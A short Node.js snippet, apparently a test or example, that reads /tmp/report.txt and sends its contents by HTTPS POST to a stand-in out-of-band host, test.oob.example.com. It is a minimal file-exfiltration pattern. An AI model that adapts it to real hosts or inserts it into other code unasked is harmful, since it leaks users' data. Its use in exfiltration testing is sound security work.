const fs = require('fs'); const https = require('https');
const bytes = fs.readFileSync('/tmp/report.txt');
const req = https.request({hostname:'test.oob.example.com',method:'POST'});
req.write(bytes); req.end();
